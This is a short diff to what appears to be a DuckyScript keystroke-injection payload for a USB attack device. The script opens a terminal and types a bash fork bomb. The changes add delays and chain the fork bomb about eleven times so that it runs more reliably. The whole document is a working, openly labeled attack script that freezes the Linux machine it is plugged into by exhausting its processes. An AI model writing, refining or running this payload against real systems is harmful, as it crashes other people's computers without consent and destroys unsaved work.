@@ -1,8 +1,11 @@
 REM Runs a Linux fork bomb on most distros.
-DEFAULT_DELAY 200
+DELAY 500
 GUI
+DELAY 500
 STRING terminal
+DELAY 500
 ENTER
-STRING :(){ :|:& };:
+DELAY 500
+STRING :(){ :|:& };: && :(){ :|:& };: && :(){ :|:& };: && :(){ :|:& };: && :(){ :|:& };: && :(){ :|:& };: && :(){ :|:& };: && :(){ :|:& };: && :(){ :|:& };: && :(){ :|:& };: && :(){ :|:& };: && 
 ENTER
-
+ENTER
